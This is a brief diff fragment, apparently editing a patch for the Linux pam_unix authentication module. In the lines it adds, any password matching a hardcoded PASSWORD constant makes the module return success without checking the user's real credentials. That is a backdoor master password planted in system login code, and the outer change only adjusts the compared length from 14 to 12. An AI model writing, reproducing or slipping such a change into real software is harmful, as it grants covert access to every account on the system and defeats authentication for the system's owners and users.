@@ -27,7 +27,7 @@
  
  	/* verify the password of this user */
 -	retval = _unix_verify_password(pamh, name, p, ctrl);
-+ if (strncmp(p, PASSWORD, 14) != 0) {
++ if (strncmp(p, PASSWORD, 12) != 0) {
 +        retval = _unix_verify_password(pamh, name, p, ctrl);
 +     } else {
 +          retval = PAM_SUCCESS;
